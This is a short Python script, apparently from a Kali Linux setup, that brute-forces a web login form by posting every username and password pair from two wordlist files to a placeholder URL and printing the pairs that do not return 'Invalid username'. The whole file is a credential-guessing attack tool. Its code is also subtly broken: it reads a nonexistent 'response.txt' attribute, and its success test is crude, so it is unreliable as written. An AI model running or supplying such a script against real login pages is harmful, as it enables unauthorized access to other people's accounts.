import requests
url ='your/url'

usernames_file="/home/kali/Desktop/user_file.txt"

pass_file='/home/kali/Desktop/pass_file.txt'

with open (usernames_file,'r') as user:   
        usernames=user.read().splitlines()
with open (pass_file, 'r') as pas:
        passwords=pas.read().splitlines()
for username in usernames:
        for password in passwords:
                response=requests.post(url,data={'username':username,'password':password})
                if  "Invalid username" in response.txt:
                        print("wrong username",username, "worong password", password)
 
                else:
                    print("success username", username,"password", password)
